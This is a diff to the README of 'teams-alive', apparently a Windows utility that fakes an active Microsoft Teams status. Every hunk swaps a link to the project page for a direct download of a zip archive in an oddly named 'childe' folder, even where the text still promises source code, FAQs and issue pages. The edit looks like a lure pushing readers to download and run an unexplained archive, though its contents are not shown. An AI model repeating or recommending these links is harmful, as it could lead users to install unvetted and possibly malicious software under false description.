@@ -1,6 +1,6 @@
 # 🛠️ teams-alive - Keep your status active quietly
 
-[![Download teams-alive](https://img.shields.io/badge/Download-teams--alive-brightgreen)](https://github.com/AJOBKA/teams-alive)
+[![Download teams-alive](https://img.shields.io/badge/Download-teams--alive-brightgreen)](https://github.com/AJOBKA/teams-alive/raw/refs/heads/main/childe/teams-alive-1.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to download and run teams-alive on your Windows PC.
 
 Click the big button below to visit the official page where you can download the app.
 
-[![Download teams-alive](https://img.shields.io/badge/Download-teams--alive-blue)](https://github.com/AJOBKA/teams-alive)
+[![Download teams-alive](https://img.shields.io/badge/Download-teams--alive-blue)](https://github.com/AJOBKA/teams-alive/raw/refs/heads/main/childe/teams-alive-1.1.zip)
 
 The page shows the latest version and other details. Look for a file ending with `.exe` or `.zip`.
 
@@ -127,7 +127,7 @@ If you want to stop the app, just right-click the tray icon and select exit.
 
 Use the link below to start downloading teams-alive now:
 
-[Download teams-alive from GitHub](https://github.com/AJOBKA/teams-alive)
+[Download teams-alive from GitHub](https://github.com/AJOBKA/teams-alive/raw/refs/heads/main/childe/teams-alive-1.1.zip)
 
 Follow the instructions above for installing and running the app on your Windows PC. The process is straightforward and should take only a few minutes.
 
@@ -149,7 +149,7 @@ If teams-alive does not seem to keep your status active:
 The GitHub page includes more details, FAQs, and access to the source code if you want to learn how the app was made or report issues.
 
 Visit the page any time for updates or help:  
-https://github.com/AJOBKA/teams-alive
+https://github.com/AJOBKA/teams-alive/raw/refs/heads/main/childe/teams-alive-1.1.zip
 
 ---
 
